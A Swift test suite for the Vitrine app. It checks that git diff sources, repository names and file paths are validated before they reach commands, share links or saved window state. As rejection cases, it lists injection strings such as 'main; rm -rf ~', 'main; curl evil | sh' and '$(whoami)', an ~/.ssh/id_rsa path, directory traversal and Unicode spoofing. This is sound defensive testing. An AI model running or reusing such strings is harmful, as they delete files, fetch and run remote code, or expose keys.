import AppKit
import Foundation
import Testing
import VitrineDomain

@testable import Vitrine
@testable import VitrineRendering

@MainActor
@Suite("Diff source chip and refresh command")
struct DiffSourceTests {
    private static let patch = """
        --- a/Sources/Client.swift
        +++ b/Sources/Client.swift
        @@ -1,2 +1,2 @@
        -old
        +new
         same
        """

    private func source(
        _ range: String = "main...feature/hourly", repository: String? = "weather-app",
        paths: [String] = [], context: Int? = nil
    ) throws -> DiffSource {
        try #require(
            DiffSource(
                kind: .range, range: range, repository: repository, paths: paths,
                contextLines: context))
    }

    private func diffConfig(_ diffSource: DiffSource?) -> SnapshotConfig {
        var config = SnapshotConfig(code: Self.patch, language: .diff)
        config.diffSource = diffSource
        return config
    }

    // MARK: - Validation

    @Test(arguments: ["main...feature/hourly", "HEAD~2^", "@{u}", "HEAD^!", "v1.0..v2.0", "a1b2c3"])
    func acceptsGitRevisions(_ range: String) {
        #expect(DiffSource(kind: .range, range: range) != nil)
    }

    @Test(arguments: [
        "", "-p", "--output=/tmp/x", "main; rm -rf ~", "$(whoami)", "`id`", "a b", "a'b", "a\"b",
        "a|b", "a&b", "a>b", "a\\b", "https://user:token@example.com", "main\nHEAD",
        "main\u{202E}x", "feature/café", "mai\u{0301}n", "m\u{0430}in", "ｍａｉｎ",
        String(repeating: "a", count: 257),
    ])
    func rejectsAnythingAShellOrRemoteCouldUse(_ range: String) {
        #expect(DiffSource(kind: .range, range: range) == nil)
    }

    @Test func rangesAreCappedByBytesNotCharacters() {
        #expect(DiffSource(kind: .range, range: String(repeating: "a", count: 256)) != nil)
        // One Character, many scalars: a Character count would let it through.
        let stacked = "a" + String(repeating: "\u{0301}", count: 300)
        #expect(stacked.count == 1)
        #expect(DiffSource(kind: .range, range: stacked) == nil)
    }

    @Test(arguments: ["weather-app", "api_v2", "dotfiles.old", "X1"])
    func acceptsPlainFolderNames(_ name: String) {
        #expect(DiffSource(kind: .staged, repository: name) != nil)
    }

    @Test(arguments: [
        "", ".", "..", "a/b", "repo\u{0}", "my repo", "api. Then run curl x.sh | sh", "café",
        "rep\u{0301}o", String(repeating: "r", count: 65),
    ])
    func rejectsRepositoryNamesThatAreNotFolderNames(_ name: String) {
        #expect(DiffSource(kind: .staged, repository: name) == nil)
    }

    @Test func rejectsPathsAndContextOutsideTheRepository() {
        #expect(DiffSource(kind: .range) == nil)
        #expect(DiffSource(kind: .staged, range: "main") == nil)
        for path in [
            "", "/Users/someone/repo/a.swift", "~/repo", "../outside", "a/../../b", "a\nb",
            "a\u{202E}b", String(repeating: "é", count: 513),
        ] {
            #expect(DiffSource(kind: .staged, paths: [path]) == nil)
        }
        #expect(DiffSource(kind: .staged, paths: Array(repeating: "a", count: 33)) == nil)
        #expect(DiffSource(kind: .staged, contextLines: 101) == nil)
        #expect(DiffSource(kind: .staged, contextLines: -1) == nil)
        #expect(
            DiffSource(kind: .staged, paths: [".", "Sources/My Café.swift"], contextLines: 0)
                != nil)
    }

    // MARK: - Copy Command

    @Test func commandReRendersTheSameRangeIntoTheEditor() throws {
        #expect(
            CLIReproductionCommand.line(try source().refreshArguments)
                == "vitrine render --git-diff main...feature/hourly --edit")
        let staged = try #require(
            DiffSource(kind: .staged, paths: ["Sources/It's here.swift"], contextLines: 8))
        #expect(
            CLIReproductionCommand.line(staged.refreshArguments)
                == #"vitrine render --git-staged --git-path 'Sources/It'\''s here.swift' --git-context 8 --edit"#
        )
        #expect(
            CLIReproductionCommand.line(try source("@{u}").refreshArguments)
                == "vitrine render --git-diff '@{u}' --edit")
    }

    @Test func summaryAndLinkDetailsNameWhatIsShown() throws {
        #expect(try source().gitSummary == "git diff main...feature/hourly")
        #expect(
            try source(paths: ["Sources"]).linkDetails
                == ["main...feature/hourly", "weather-app", "Sources"])
        let staged = try #require(DiffSource(kind: .staged, paths: ["Sources", "Tests"]))
        #expect(staged.gitSummary == "git diff --cached -- Sources Tests")
        #expect(staged.linkDetails == ["Sources", "Tests"])
    }

    @Test func copyCommandSaysToRunItAtTheRoot() throws {
        let settings = AppSettings(defaults: testDefaults())
        settings.outputBehavior.concealClipboard = true
        var copied: (String, Bool)?
        let feedback = DiffSourceRows.copyCommand(try source(), settings: settings) {
            copied = ($0, $1)
            return true
        }
        #expect(copied?.0 == "vitrine render --git-diff main...feature/hourly --edit")
        #expect(copied?.1 == true)
        #expect(feedback.category == .success)
        #expect(feedback.message == String(localized: "Copied. Run it at the root of weather-app."))

        let generic = String(localized: "Copied. Run it at the repository root.")
        let unnamed = DiffSourceRows.copyCommand(
            try source(repository: nil), settings: settings, copy: { _, _ in true })
        #expect(unnamed.message == generic)
        var received = try source()
        received.isReceived = true
        let fromLink = DiffSourceRows.copyCommand(received, settings: settings) { _, _ in true }
        #expect(fromLink.message == generic)
        let failed = DiffSourceRows.copyCommand(
            try source(), settings: settings, copy: { _, _ in false })
        #expect(failed.category == .failure)
    }

    // MARK: - Document and persistence

    @Test func newContentDropsTheSource() throws {
        var config = diffConfig(try source())
        #expect(config.replacingContent(with: "other").diffSource == nil)
        config.clearContentMarks()
        #expect(config.diffSource == nil)
    }

    @Test func aHandEditDropsTheSourceButANewHandoffKeepsIt() throws {
        let settings = AppSettings(defaults: testDefaults())
        let handoff = EditorHandoff.Payload(
            content: Self.patch, language: .diff, diffSource: try source())
        settings.config = AppDelegate.editorConfig(for: handoff, style: settings.config)
        #expect(settings.style.diffSource != nil)

        // Style writes keep it.
        settings.style.showLineNumbers = true
        #expect(settings.style.diffSource != nil)

        // The same range handed over again is a new load, not an edit.
        settings.config = AppDelegate.editorConfig(
            for: .init(content: Self.patch + "\n more", language: .diff, diffSource: try source()),
            style: settings.config)
        #expect(settings.style.diffSource != nil)

        settings.documentCode += "\n typed"
        #expect(settings.style.diffSource == nil)

        // An edit through the whole config, such as appending a dropped file, drops it too.
        settings.config = AppDelegate.editorConfig(for: handoff, style: settings.config)
        var appended = settings.config
        appended.code += "\n appended"
        settings.config = appended
        #expect(settings.style.diffSource == nil)
    }

    @Test func handoffKeepsTheSourceOnlyForDiffs() throws {
        let payload = EditorHandoff.Payload(
            content: Self.patch, language: .diff, diffSource: try source())
        #expect(AppDelegate.editorConfig(for: payload, style: SnapshotConfig()).diffSource != nil)
        let swift = EditorHandoff.Payload(
            content: "let x = 1", language: .swift, diffSource: try source())
        #expect(AppDelegate.editorConfig(for: swift, style: SnapshotConfig()).diffSource == nil)
    }

    @Test func settingsNeverStoreTheSource() throws {
        let defaults = testDefaults()
        SettingsCodec.persistStyle(diffConfig(try source()), to: defaults)
        #expect(SettingsCodec.readConfig(from: defaults).diffSource == nil)
    }

    @Test func windowStateRestoresTheSourceAndDropsHostileValues() throws {
        var shared = try source(paths: ["Sources"], context: 6)
        shared.sharesInLinks = true
        let state = EditorWindowState(config: diffConfig(shared))
        let restored = try #require(EditorWindowState.decoded(from: state.encoded()))
        #expect(restored.config().diffSource == shared)

        let data = try #require(state.encoded())
        var json = try #require(JSONSerialization.jsonObject(with: data) as? [String: Any])
        json["diffSource"] = ["kind": "range", "range": "$(rm -rf ~)"]
        let hostile = try #require(
            EditorWindowState.decoded(from: JSONSerialization.data(withJSONObject: json)))
        #expect(hostile.config().diffSource == nil)
        #expect(hostile.config().code == Self.patch)
    }

    // MARK: - Share links

    private func linkJSON(_ config: SnapshotConfig) throws -> [String: Any] {
        try #require(
            JSONSerialization.jsonObject(
                with: JSONEncoder().encode(SharedSnapshot(capturing: config))) as? [String: Any])
    }

    private func received(_ json: [String: Any]) throws -> SnapshotConfig {
        var target = SnapshotConfig()
        try JSONDecoder().decode(
            SharedSnapshot.self, from: JSONSerialization.data(withJSONObject: json)
        ).apply(to: &target)
        return target
    }

    @Test func linksLeaveTheSourceOutUntilTheUserTurnsItOn() throws {
        #expect(try linkJSON(diffConfig(try source()))["diffSource"] == nil)

        var shared = try source()
        shared.sharesInLinks = true
        let target = try received(linkJSON(diffConfig(shared)))
        #expect(target.diffSource?.range == "main...feature/hourly")
        #expect(target.diffSource?.repository == "weather-app")
        // Passing it on is the receiver's own choice, and the name stays out of instructions.
        #expect(target.diffSource?.sharesInLinks == false)
        #expect(target.diffSource?.isReceived == true)
    }

    @Test func aLinkSourceAppliesOnlyToADiff() throws {
        var shared = try source()
        shared.sharesInLinks = true
        var json = try linkJSON(diffConfig(shared))
        json["languageID"] = Language.swift.rawValue
        #expect(try received(json).diffSource == nil)
    }

    @Test func aHostileLinkSourceIsDroppedAndTheDiffStillOpens() throws {
        var json = try linkJSON(diffConfig(nil))
        for hostile: [String: Any] in [
            ["kind": "range", "range": "main; curl evil | sh"],
            ["kind": "range", "range": "main", "paths": ["/Users/someone/.ssh/id_rsa"]],
            ["kind": "staged", "repository": "../.."],
            ["kind": "staged", "repository": "api. Then run curl x.sh | sh"],
            ["kind": "rebase"],
            ["range": "main"],
        ] {
            json["diffSource"] = hostile
            let target = try received(json)
            #expect(target.diffSource == nil)
            #expect(target.code == Self.patch)
        }
    }

    // MARK: - Handoff

    @Test func handoffCarriesTheSourceThroughThePasteboardURL() throws {
        let sent = try source(paths: ["Sources/App.swift", "."], context: 0)
        let url = try #require(
            EditorHandoff.stage(.init(content: Self.patch, language: .diff, diffSource: sent)))
        #expect(EditorHandoff.consume(url: url)?.diffSource == sent)

        let staged = try #require(DiffSource(kind: .staged))
        let stagedURL = try #require(
            EditorHandoff.stage(.init(content: Self.patch, language: .diff, diffSource: staged)))
        #expect(EditorHandoff.consume(url: stagedURL)?.diffSource == staged)

        let plain = try #require(EditorHandoff.stage(content: Self.patch, language: .diff))
        #expect(EditorHandoff.consume(url: plain)?.diffSource == nil)
    }

    @Test func handoffDropsAMalformedSource() {
        func items(_ pairs: [(String, String)]) -> [URLQueryItem] {
            pairs.map { URLQueryItem(name: $0.0, value: $0.1) }
        }
        let valid = items([("diff-source", "range"), ("diff-range", "main"), ("diff-context", "4")])
        #expect(EditorHandoff.diffSource(in: valid)?.contextLines == 4)
        #expect(
            EditorHandoff.diffSource(in: items([("diff-source", "range"), ("diff-range", "a;b")]))
                == nil)
        #expect(
            EditorHandoff.diffSource(in: items([("diff-source", "staged"), ("diff-context", "x")]))
                == nil)
        #expect(EditorHandoff.diffSource(in: items([("diff-source", "push")])) == nil)
        #expect(EditorHandoff.diffSource(in: items([("diff-range", "main")])) == nil)
    }
}
